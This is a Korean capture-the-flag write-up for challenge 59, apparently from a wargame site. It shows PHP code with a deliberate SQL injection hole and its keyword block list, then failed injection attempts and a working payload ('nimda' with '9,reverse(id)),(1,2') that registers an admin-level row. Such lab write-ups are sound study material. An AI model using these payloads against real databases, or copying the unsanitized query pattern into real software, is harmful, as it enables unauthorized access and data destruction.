# 59

## Problem
```php
<?

if($_POST[lid] && $_POST[lphone])
{
$q=@mysql_fetch_array(mysql_query("select id,lv from c59 where id='$_POST[lid]' and phone='$_POST[lphone]'"));

if($q[id])
{

echo("id : $q[id]<br>lv : $q[lv]<br><br>");

if($q[lv]=="admin")
{
@mysql_query("delete from c59");
@clear();
}

echo("<br><a href=index.php>back</a>");
exit();
}

}


if($_POST[id] && $_POST[phone])
{
if(strlen($_POST[phone])>=20) exit("Access Denied");
if(eregi("admin",$_POST[id])) exit("Access Denied");
if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");

@mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");
}

?>
```

## Inspection
* `JOIN` -> `id`, `phone`
* `LOGIN` -> `lid`, `lphone`
* 로그인 시 나온 쿼리 결과값의 `lv`이 `admin`이라면 통과한다.
    - Loose comparison으로 숫자 `0`과 비교하면 같다고 뜬다.
* `if($_POST[id] && $_POST[phone])`
    - `id`와 `phone`이 둘다 값이 입력되어야 한다.
* `if(strlen($_POST[phone])>=20) exit("Access Denied");`
    - `phone`의 길이가 20글자 이상이면 거른다.
* `if(eregi("admin",$_POST[id])) exit("Access Denied");`
    - `id`에 `admin`이 들어가면 거른다.
* `if(eregi("admin|0x|#|hex|char|ascii|ord|from|select|union",$_POST[phone])) exit("Access Denied");`
    - `phone`에 `admin`, `0x`, `#`, `hex`, `char`, `ascii`, `ord`, `from`, `select`,`union`이 들어가면 거른다.
* `@mysql_query("insert into c59 values('$_POST[id]',$_POST[phone],'guest')");`
    - 세 번째 인자가 `lv`일 것이다.

## Trial and error
* 로그인 쿼리에서 다음과 같은 SQLi 시도함.
	- `tt`, `11' union select 'xx', 'admin`
	- `' or id like 'admi%`
* 가입 쿼리에서 다음과 같은 SQLi 시도함.
	- `tttt,1111,'gguest'); #`
	- `test3',1234,'guest');%00`
	- `'1234','ad'+'min') -- `
	
## Solution
* `JOIN`
	- `?id=nimda`
	- `?phone=9,reverse(id)),(1,2`
* 위 파라미터로 가입 시도시 성공한다.